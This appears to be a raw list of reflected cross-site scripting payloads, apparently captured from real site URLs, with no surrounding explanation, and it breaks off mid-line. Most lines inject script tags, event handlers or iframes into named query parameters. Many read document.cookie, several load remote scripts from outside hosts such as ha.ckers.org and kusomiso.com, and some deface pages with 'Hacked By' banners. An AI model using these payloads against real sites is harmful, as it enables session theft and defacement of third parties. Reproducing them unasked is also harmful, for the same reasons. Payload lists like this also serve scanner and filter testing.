+iMappeID=180&sSideNavn=Receptlistning&intSideNr=1&selVarldensMat=0&selHelg=0&selRecept=0&selHuvudIngrediens=0&selMaltid=0&SearchValue="><script>alert(123)</script>
+error=1&kon=&skola=&email=&program=&poang=&a_namn="><script>alert(123)</script>&f_namn=&e_namn=&p_nr=&p_ort=&alder=&felav=* Du m�ste godk�nna och l�sa de Allm�nna villkoren&felprogram=* Du gl�mde att skriva vilken kurs eller vilket program du l�ser!&alderfel=* Fyll i ditt f�delsedatum!&p_nrfel=* Fyll i ett postnummer!&postortfel=* Fyll i en postort!&losenfel=* L�senorden m�ste vara lika och �ver 4 tecken l�ngt!&a_namnfel=* Anv�ndarnamnet �r inte giltigt!&felmail=* Skriv en korrekt email-adress!&konfel=* V�lj ett k�n!&bonuskod=&gatuadressfel=Du m�ste ange gatuadress!
+q="><h1><marquee>---+XSSED+---</marquee></h1>&search=Search+Our+Site
+domain="><script>alert(1)</script>&ext=com
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+recherche=<script>alert(1337)</script><marquee><h1>XSS+by+Zeryus</h1></marquee>&imageField2.x=0&imageField2.y=0
+d="><script>alert(123)</script>&lid=Cirkuskiosken&from=menu
+query="><script>alert(document.cookie);</script>
+q=HOVER+ME!!!"+onmouseover="alert(123)
+ml=</a><script>alert(document.cookie);</script>
+so="><script>alert(document.cookie);</script>
+query="><script>alert(1)</script>
+l="><script>alert(123)</script>
+searchMode="><script>alert(1)</script>&presenter="><script>alert(1)</script>
+s=<script>alert('xss+by+double_check')</script>
+what=wp&lang=&ax=&search_word=</title><scRipT>alert(123)</scRIpT>&geo_area=
+step=userinfo&bIncludeAuth=1&firstName="><script>alert(1)</script>&lastName="><script>alert(1)</script>&credentials=MD&state=AZ&zip="><sc&dateOfBirth_month=0&dateOfBirth_day=0&dateOfBirth_year=1900&dateOfBirth=-2208880694731&email="><script>alert(1)</script>&userName="><script>alert&password="><script>alert&confirmPassword="><script>alert&primarySpecialty=&secondarySpecialty=&tertiarySpecialty=&promocode="><script>alert(1)</
+q=">'><scRipT>alert(123)</scRIpT>
+nid=-<"<<sCrIpT>alert(document.cookie)</ScRipT>
+item=600685&title="><h1>Xssed<script>alert(document.cookie)</script>><marquee><h1>BackDoor</h1></marquee>
+item="><script>alert(document.cookie)</script>><marquee><h1>BackDoor</h1></marquee>
+page=tour&id="><script>alert(document.cookie)</script>><html><input type="file"></html><marquee><h1>BackDoor</h1></marquee>
+forgotPasswordUsername=<iframestyle="position:absolute;left:0;top:0;z-index:9999" src="http://www.xssed.com/" width=100%height=4000 frameborder=0 scroll=no></iframe>
+qs=">>>><iframe+src="http://ha.ckers.org/xss.jpg"
+lid=20071123194608&langue2=fr&email=<script>alert(1337)</script><marquee><h1>XSS+by+Zeryus</h1></marquee>&action=subscribe&submit=OK
+mot=<script>alert(1337)</script><marquee><h1>xss+by+zeryus</h1></marquee>
+mot=<script>alert(1337)</script><marquee><h1>XSS+by+Zeryus</h1></marquee>&m=se
+display="><marquee><h1>Defaced by ironzorg</h1></marquee>
+searchstring="><marquee><h1>Defaced by ironzorg</h1></marquee>
+action=seek&mots=<script>alert(1337)</script><marquee><h1>XSS+by+Zeryus</h1></marquee>&nb_results2show=10&booleen=AND
+id="><script>alert(document.cookie)</script>
+q='"></title><script>alert(1337)</script>><marquee><h1>XSS+by+Xylitol</h1></marquee>&btnG=yPass.net+Search&ypassonly=0
+cat=6&keyword=<script>alert(1337)</script><marquee><h1>XSS+by+Zeryus</h1></marquee>&opt=0&Submit3=Recherche
+swhat="><marquee><h1>Defaced+by+ironzorg</h1></marquee>&submit=ok
+category_id="><script>alert(document.cookie)</script>><marquee><h1>BackDoor</h1></marquee>
+q=<script>alert(31337)</script>&ie=&site=&output=xml_no_dtd&client=REALTOR_org&lr=&proxystylesheet=REALTOR_org&oe=ISO-8859-1
+keywords="><script>alert("g3");</script>
+words="><marquee><h1>Defaced by ironzorg</h1></marquee>
+id="><script>alert(document.cookie)</script>
+search="><script>alert(1)</script>&limit=25
+intPictureCategoryNr="><script>alert(420)</script>
+opendocument=&Q20=Y&A=&F=&G25=&R=&SD=8-12-2007&ED=15-12-2007&P=");alert("123
+query="><script>alert(document.cookie)</script>  ><marquee><h1>xss By BBc04 FoR HRC++</h1></marquee>&errors=0&age=&maxfiles=50&maxlines=30
+s="'/><script>alert(document.cookie)</script>
+nosearch=&what=x"><scRipt>alert(123)</ScrIpt>"&where=&lat=&lon=&categoryname=&categoryid=&ddtype=&ddsearch=&ddtitle=&mode=super&op=
+profile_id="><script>alert("BackDoor")</script>
+</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>
+domain="><script>alert(1)</script>&ext=com
+id=1">by starext sistemde acik var ltfen kapatiniz acil durum!!!
+"><iframe/\/src=jAva&Tab;script:alert(1)>
+record="><script>alert(123)</script>
+'><style><img src="</style><img src=x onerror=alert(1)//">
+id=606826wawa);woot</script><script>alert(123
+city=1&sheriff=1&beg_date=01/01/2006&title=1&phrase='"></title><script>alert(1337)</script>><marquee><h1>XSS+by+Xylitol</h1></marquee>&xsubmit=Search:
+site="<script>alert(document.cookie)</script>
+number="><script>alert("CYBER//FOR-FERDA")</script>
+id="><script>alert("Ownz+Your+System+By+Vagrant")</script>
+game="><script>alert(/www.r3t.n3t.nl/)</script>
+viewkey="><script src=http://byccc.awardspace.com/js/xssccc.js></script>
+TextFritext="><script>alert(123)</script>
+rv=2&qr="><script>alert(1)</script>+&area=1&x=10&y=13
+nats="><iframe src=http://pc-kopat.us/hacked/>
+rumuz="><script>a=/:D/;alert(a.source)</script>
+name="><script>alert("hayirli+ramazanlar")</script>
+"><SCRIPT a=">" '' SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
+NewsID="><script>alert(document.cookie)</script>><marquee><h1>By+Narcoticxs</h1></marquee>
+what=BeginSearch&page=1&fromSearch=1&srchCat=ALL&srchManuf=ALL&srchSortBy=2&srchQuery=/></><script>alert(1)</script>&min=$0.00&max=$0.00&srchNumRecs=20&rbSrchType=ALL
+badsearch=1&sf=&company="><script>alert('CYBER')</script>
+<a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>
+sektor="><script>alert(document.cookie)</script>
+search=<h1>Hacked+By+Dialogitec+ImeCiQ</h1><!--&find=S�g
+type=1&freecontent="<script>alert("HACKED")</script>&depts=0&brands=0&G�nder=ARA
+affid='"><iframe src=http://pc-kopat.us/hacked/>
+<body/onpageshow=alert(1);>
+page=<SCRIPT>alert(document.body.innerHTML=/"Hacked By Root_op"/)</SCRIPT>
+vdbsearch="><h1>Xss+by+n0b0dy+</h1>&submit2.x=10&submit2.y=10
+P=1&kenken=">'><script>alert("kusomiso.com")</script>
+<a onmouseover="alert(document.cookie)">X link</a>
+textArea=''></script><h1>HackedByCiCoSz</h1>
+action=sendHForm&TypeOfUser="><script>alert(2)</script>&Usr="><script>alert(3)</script>&Pswd="><script>alert(4)</script>
+partner='>"><SCRIPT/SRC=http://kusomiso.com/xss.js></SCRIPT>&header=1
+DLN=27537&ctportalNav="/><iframe src=http://google.com></iframe><script src=http://ha.ckers.org/xss.js?/>
+sort=by_lastlogin&table=GALERIE&sl_altersbereich=egal&tb_nickname="><script>alert(/TotalSchaden/)</script>&tb_plz=&sl_bundesland=egal&suche_starten.x=34&suche_starten.y=12&aktion=ver_SEARCHING_BEARBEITEN
+regid="><script>alert("MaXWeL")</script>
+p=9&search=</textarea><br><code+onmouseover=a=eval;b=alert;a(b(/Hexspirit/.source));><br>Hexspirit+<---+PUT+MOUSE+OVER</code>&x=11&y=17
+orderby=&text_condition=all&searchboxtyped=short&text="><script>alert(1)</script>&SEARCH=Search&text_fields=headline+content
+<script a b c >alert(1)</script d e f>
+Fatal=0&Severity=3&Category=3&EventID=3201&HideResetBtn=0&HideDetails=1&Msg=>"><title>Norehem was here</title><SCRIPT>alert('Norehem WaS HeRe!!')</SCRIPT><H1><H1><H1><marquee>Norehem was here</marquee></H1></H1></H1><CENTER><IMG SRC="http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif"></CENTER><iframe src=http://jersain.iespana.es/xss.html <
+UserName="><img src=x onerror=alert(1);>
+u1=http://cyber-unity.com&m1=<script>alert(document.cookie)</script>&m2=<h1>Cyber-Unity</h1>&m3=bys3aL&m4=<h1>System By XSSED!</h1>
+ReturnURL=/search?keywords='"<script>alert(1)</script>
+'><marquee/onstart=alert(1)>
+ID=3558&dil=TR&page=grup.asp&results="><script>alert(document.cookie)</script>
+"><SCRIPT SRC=//127.0.0.1:3555/xss_serve_payloads/.j>
+do=now&words='><SCRIPT>alert('XSS_Alert')</SCRIPT>&intMaxHits=15
+keywords="><script>alert("MaXWeL")</script>
+contenttype=<script>alert(document.cookie)</script>
+sec="><script>alert('By Encore')</script>
+q_aw="><script>alert("EKBER")</script>
+sc=7"><script>alert(/xss/)</script>
+cat=SoutheastAsia&ver=Collections<script>alert('Agd_Scorp')</script> 
+option=com_letterman&Itemid=>"><ScRiPt >alert(666);</ScRiPt>
+url=404&pagerequested=<script>alert(1)</script>
+month="><script>alert(document.cookie)</script>
+pr=li&lid=''></script><script>alert(document.cookie)</script><h1>XssByNarcoticxs</h1>
+sSearch="><script>alert("MaXWeL")</script>
+Page="/></a></><img src=1.gif onerror=alert(1)>
+url=/contactus/email.asp&er=noemailinfo&returl="><script>alert('Seymen')</script>
+month="><script>alert(document.cookie)</script>
+a[]="><script>alert(document.cookie)</script>
+searchfor="><script>alert("MaXWeL")</script>
+keyword=doc+de+instalacion+apache/search.php?keyword=>"><script>alert('iNs uNkn0wn.eu CreW')</script>
+aid=10276&subaff=99&keyword="><script>alert(0)</script>
+ara="><script>alert(document.cookie)</script>><marquee><h1>By+Narcoticxs</h1></marquee>
+q=</title><script>alert(/xssed/);</script></head><!--
+submitButton.x=18&submitButton.y=7&affiliateId=132714989&searchMode=site&sortBy=&q="><script src="http://freewebs.com/skunkf00t/X.js"></script>
+culture="><body onload="alert('XSS')"><metacontent="
+</ScrIpt><SCRIPT>alert(1);</SCRIPT>
+description=<script>alert('sleaz');</script>
+</ScrIpt><script>prompt(-[])</script>
+MFG_DESC="><script>alert('CYBER')</script>
+id=learning_the_ropes"><script>alert(document.cookie)</script>
+SearchView&Count=15&Query=<script>alert(document.cookie)</script>
+type=6&keyword="><script>alert(BackDoor)</script>><marquee><h1>BackDoor</h1></marquee>
+page="><script>alert(document.cookie)</script>><marquee><h1>BackDoor</h1></marquee>
+'><img \x00src=x onerror="javascript:alert(1)">
+search=<script>alert(0)</script>
+s="><script>alert('Pwned+by+NEO+and+GURU+OF+www.hacking-gurus.com')</script>&x=13&y=12
+psc_prod="><script>alert("MaXWeL")</script>
+cmd="><script>alert("JoCk3r")</script>
+url=http://uber0n.darkillusion.org/xsspage.htm
+task=search&q="><script>alert(/beyrut-kaI3uS/)</script>
+lang="><script>alert("FROST_MATURIDI")</script>
+"><script/&Tab; src='http://127.0.0.1:3555/xss_serve_payloads/X.js' /&Tab;></script>
+searchcriteria="><script>alert(document.cookie)</script>
+REF='><iframe src=http://google.com>
+<%0ascript>alert(1);</script>
+objid="><script>alert("MaXWeL")</script>
+page=<script>alert(/xss/);</script>
+a[]=><script>alert(/KaBuS-KabusTr.coM/);</script>
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+d=8"><script>alert(document.cookie)</script>
+sourcecode="><script>alert("MaXWeL")</script>
+q=<font+color=red><marquee>Mutant+Hacked+This+Page</marquee><br>Ewilhelm+should+be+ashamed<br><br>+<marquee>j00+g0t+0wn3d</marquee><br><br><br><img+src="http://0wn3d.dk/owned/bmwowned.jpg>&limit:type:instructable=on&type:instructable=on&type:user=on&type:comment=on&type:group=on&type:forumTopic=on
+gb=urun&id=293&ortak="><script>alert("BackDoor")</script>
+page=gettingstarted&lang="><script>alert(document.cookie)</script>
+record_number=1971"><script>alert  ('http://saime.biz // xss')</script>
+forum='"><h1>RubberDuck</h1><br><br><marquee>WhiteHat Forever</marquee>
+errmessage="><script>alert(/=XSSByDT=/)</script>
+url=http://uber0n.darkillusion.org/xsspage.htm
+url=http://www.geocities.com/pinkelephant2k7/stallowned.html
+words=">'><ScRiPt>alert(123)</sCrIpT>"'
+keyword="<script+src=http://vuln.xssed.net/thirdparty/scripts/hotpockets.js>
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+"><IMG SRC=`javascript:alert(?X says, ?X??)`>
+words="><script>alert("BackDoor")</script>
+id=869&letter=X"><h1>XSS by C1c4Tr1Z!</h1>
+message=<IMG SRC="http://www.freewebs.com/fi2ebug/biohazard-pirate-skull-tattoo_SC_hack.PNG">
+what_ltr=<ScRiPT>alert(document.cookie)</sCrIpT><"<<sCrIpT>alert("Greetz to Hachk4spy np board")</sCrIpT>>"><<script>+document.body.innerHTML+=+"<h1>XSSBUG</h1><br>Owned+by+King+of+Chaos+";+document.titel+=+"Warung!";+document.bgColor=+"red"+</script>
+</ScrIpt><script>alert(1)</script>
+tab=test&user=me"><script>alert(/XSSED_By_Soroush.SecProject.Com_4_XSSED.COM/)</script><fake "
+q="/><iframe src=http://google.com></iframe><script src=http://ha.ckers.org/xss.js?/>
+vp=3&pp=&pc=10&m=&mk=&sp1=&dl=&nw=&rc=&nk=&c=&c1=&c2=&dl=&mn=&gn=&price=&cn=&ln=&etc=&color=&sort=nm&s=&ak=&cam_no="><script>alert(document.cookie)</script>><marquee><h1>By+Narcoticxs</h1></marquee>
+'><a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
+m=roportaj&i=oku&id="><script>alert(document.cookie)</script>
+r=>">'><SCRIPT SRC=http://elredtuning.altervista.org/red.js></SCRIPT>
+TO_ID=2445&TO_NA=RONI+SIZE+@+NASA+19.+APRIL.&FO_ID=10&FO_NA="><script>alert('CYBER')</script>
+wid="><script>alert(123)</script>><marquee><h1>XSS+by+GTADarkDude</h1></marquee>&pagina=forum
+s=<script>alert(/xss/);</script>
+redirect="><script>alert(document.cookie)</script>
+asc=&sortby=&size="><center><h1>"Hacker Safe"?? XSS by C1c4Tr1Z</h1></center>
+threadprefix="><script>alert(document.cookie);</script>
+txtkeys1="><script>alert('CYBER')</script>
+<img src="javascript:alert(1)">
+txtSearch='>"><SCRIPT/SRC=http://kusomiso.com/xss.js></SCRIPT>
+id=<body onload=alert(/xssed_by_adt/)>
+keywords="><script>alert("BackDoor")</script>
+mod=search&type=simple&q="><script>alert("BackDoor")</script>
+pID="><script>alert("MaXWeL")</script>
+cx[][][][][][][][][][][][][][][][][][]="><script>alert(document.cookie)</script>
+palavras=<script>alert(2008)</script>
+newsid="><script>alert(document.cookie)</script>
+s="><script>alert(/Scr34M/);</script>
+mode=search&M_NAME=G&initial=1&method="><script>alert("XssedByCicosz")</script>
+><script>X<\/script>
+TO=<script>alert("kaksii was here")</script>
+a=newcc&r="><script>alert("siktirin gidin a.q reverse ip paral�ym��")</script>
+'><video><source onerror="prompt(1)"></source></video>
+page=recherche&recherche=<script>alert(123)</script>&rechercher_btn.x=0&rechercher_btn.y=0
+"><frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
+KONTO="><iframe src=http://www.google.de>
+catid="><script>alert("MaXWeL")</script>
+url=Busindre"><script>alert(document.cookie)</script>
+Fatal=0&Severity=1&Category=3&EventID=3200&HideResetBtn=0&HideDetails=1&Msg=<SCRIPT>alert('Norehem WaS HeRe!!')</SCRIPT><H1><H1><H1><marquee>Norehem was here</marquee></H1></H1></H1><CENTER><IMG SRC="http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif"></CENTER>
+str=<script>alert(/xssed/)</script>&Submit=Cauta/Search&cx=searchaaa1110
+txt_search=<font+size=300+face=ariel+color=red>+Test+Hacked+for+XSS!!!</font>&search.x=14&search.y=11
+quali=stellen&orte=<script>+document.body.innerHTML+=+"<h1>King of Chaos - German Elite Hacker</h1><br>Deutsche Hacker Finden Sicherheitslücke auf der DKB.  gefunden von kInGoFcHaOs Hackercrew: Team of Defense -";</script>&Suche=<script>alert("XSS")</script>
+query="><script>alert("By Stuarty")</script>&theme=deh&p=156
+</ScrIpt><script>javascript:alert(1)</script>
+yider="><script>alert("FROST_MATURIDI")</script>
+Topic=Mksl&Category="<script src="http://paksites.110mb.com/xss.js?><
+_did="><script>alert(1)</script>&_dtype=csv&_dcookie=0&_dpath=mapsstates,mapsstates&_dsect=1&dirHeader=
+url=http://r3t.n3t.nl&frame=false
+action=form&page=http://82.3.173.240&pagetitle=<script>alert("MoshBat Was Here ;)");</script>
+gb=urun&id=293&ortak="><script>alert("BackDoor")</script>
+v:project=firstgov&url=javascript:alert(1)&v:frame=redirect
+keywords="><script>alert(1)</script>
+<a href="javascript:alert(1)">X<a>
+"><meta charset=Shift_JIS><script>x="?\";alert(1)//"</script>
+language="></script>">'><script>alert("Arman Ires Digital Boys Underground http://xssed.com")</script>
+pagename="><script>alert("CYBER//FOR-FERDA")</script>
+islem=ara&byil=2007&bay=6&bgun=2&syil=2007&say=6&sgun=><script>alert("ex0")</script>
+TAG="><script>alert('By Encore')</script>
+keyword=advanced}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+cx=partner-pub-4314136825183072:b3c4nx-t02p&cof=FORID:11&ie=ISO-8859-1&q=">'><img+src=a+onerror=alert(document.cookie)+/>
+image_id="><script>alert("MaXWeL")</script>
+"><!--<img src=xxx:x onerror=alert(1)> -->
+currentPage=3&recordsPerPage=25&name_flag=&from_search=true&jobcat=&industry=22&seniority=&frmPositionCountry=&pastdate=&from_possearch=&pos_ref="><script>alert(document.cookie);</script>
+kde=1&co=<script>alert("xss");</script>
+viewkey="><script+src=http://byccc.awardspace.com/js/xssccc.js></script>
+site=NECC&page='><script>alert(1)</script>
+"><object/data=//goo.gl/nlX0P>
+query="><script>alert("MaXWeL")</script>
+N=0&Ntk=ALL&Nty=1&Ntx=mode+matchallpartial&Ns=P_FORMATSORTGROUP|0||CP_PUBDATEGAP|0&Nr=AND(Subsite:SimonSays,CP_IDENTIFIER:TITLES)&D=how+to+rig+an+election&Ntt="><script>alert('TreX')</script>
+flash="><script>alert("MaXWeL")</script>
+query=<marquee>sl4xxUz!</marquee>!!<script>alert('sl4xUz');</script>the+caat+iss+unnder+thee+taaable
+</ScrIpt><script>alert(alert(1))</script>
+regNum=10&termino=>"><SCRIPT>alert('Norehem WaS HeRe!!')</SCRIPT><H1><H1><H1><marquee>Norehem was here</marquee></H1></H1></H1><CENTER><IMG SRC="http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif"></CENTER><iframe src=http://jersain.iespana.es/xss.html <
+txt_arsiv_tarihi="><script>alert(document.cookie)</script>><marquee><h1>By+Narcoticxs</h1></marquee>
+id="><script>alert('CYBER//35R4-F0R3V3R')</script>
+ParentId="><script>alert(420)</script>
+`"'><img src="# onerror=alert(1)>
+text="><script>alert(/www.r3t.n3t.nl/)</script>
+in="><script>alert('CYBER')</script>
+Domain="><script>alert('PKDooM2007 was here');</script>
+option=com_content&user_rating=1&submit_vote=index2.php?option=com_content&user_rating=1&submit_vote=評価&task=vote&pop=0&Itemid=10&cid=1&url=http://xssed.com
+redirect_to=/login/forgot/">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
+zoom_query=sssssssss&zoom_per_page=10&zoom_and=0&zoom_sort="><script>alert(1)</script>
+"><body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+&pag=18&orden=&info=Array&buscar=1&lang="><script>alert(420)</script>
+'><XML ID=0><I><B>&lt;IMG SRC="javas<!-- -->cript:alert(1)"&gt;</B></I></XML>
+search='"><script>alert(document.cookie)</script>'"><iframe+src=http://www.google></iframe>&source=pocketwap.net
+language=en&url=http://www.xssed.com/archive/author=0rijin4
+Folder="><script>alert(document.cookie)</script>><marquee><h1>By+www.r3t.n3t.nl</h1></marquee>
+domain="><script>alert(1)</script>&ext=com&imageField.x=58&imageField.y=14
+"><script>alert(1)</script>
+remixType=null&contenttype=all&startday=1&startmonth=1&startyear=1970&endday=26&endmonth=6&endyear=2007&restrict4=/www.hyndburnbc.gov.uk/&q="><script>alert('nullflow');</script>&search=Go&firstindex=0
+q="><script>alert(1)</script>
+</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>
+lang="><script>alert('XssByNarcoticxs')</script><h1>XssByNarcoticxs</h1>
+ID={C9450838-EA01-475A-93E1-CED737EDE465})&language="><script>alert('CYBER')</script>
+domain="><script>alert(1)</script>&ext=com
+"><script\x2F>javascript:alert(1)</script>
+queryString1="><script>document.body.innerHTML='<h1>Hacked+by+burmese+hackers+-+<a+href="http://yehg.co.nr">yehg.co.nr</a></h1>';</script>&category=&queryContext1=SUMMARY&queryOpt1=STRINGALL&queryType1=TEXT&queryCategory=&queryResultsets=10&querySorted=&queryShowSummary=YES&searchType=simple
+bolum="><script>alert("maturidi")</script>
+errMessage=Unspecified+error&Question="+onmouseov
